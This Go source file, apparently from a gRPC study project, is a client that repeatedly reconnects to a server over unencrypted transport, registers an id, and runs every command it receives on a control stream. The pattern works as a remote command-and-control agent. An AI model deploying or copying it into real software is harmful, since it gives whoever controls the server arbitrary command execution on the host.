package main

import (
	"context"
	"fmt"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/emptypb"
	"grpc-study/control"
	"grpc-study/pb"
	"sync"
	"time"
)

var _client pb.ServiceClient

var mut sync.Mutex

func getClient() pb.ServiceClient {
	mut.Lock()
	defer mut.Unlock()
	if _client != nil && ping() == nil {
		return _client
	}
	for {
		time.Sleep(mycred.Recon)
		fmt.Println("waiting connect grpc server ...")
		credentials := grpc.WithPerRPCCredentials(&mycred)
		con, err := grpc.Dial(mycred.Addr, grpc.WithTransportCredentials(insecure.
			NewCredentials()), credentials)
		if err != nil {
			fmt.Println(err)
			continue
		}
		_client = pb.NewServiceClient(con)
		if ping() == nil {
			return _client
		}
	}
}

func ping() error {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	_, err := _client.Ping(ctx, &emptypb.Empty{})
	return err
}

type MyCred struct {
	Id    string
	Addr  string
	Recon time.Duration
}

func (m *MyCred) GetRequestMetadata(_ context.Context, _ ...string) (map[string]string, error) {
	return map[string]string{"id": m.Id}, nil
}

func (m *MyCred) RequireTransportSecurity() bool {
	return false
}

var mycred MyCred

func register(c pb.ServiceClient) (err error) {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	_, err = c.Register(ctx, &pb.Req{Id: mycred.Id})
	return
}

func recvCtl(c pb.ServiceClient) (err error) {
	var ctl pb.Service_CtlClient
	ctl, err = c.Ctl(context.Background(), &emptypb.Empty{})
	if err != nil {
		return
	}
	for {
		var cmd *pb.Cmd
		cmd, err = ctl.Recv()
		if err != nil {
			return
		}
		result, err := control.Exe(nil, cmd.Name, cmd.Arg...)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		fmt.Print(result)
	}
}
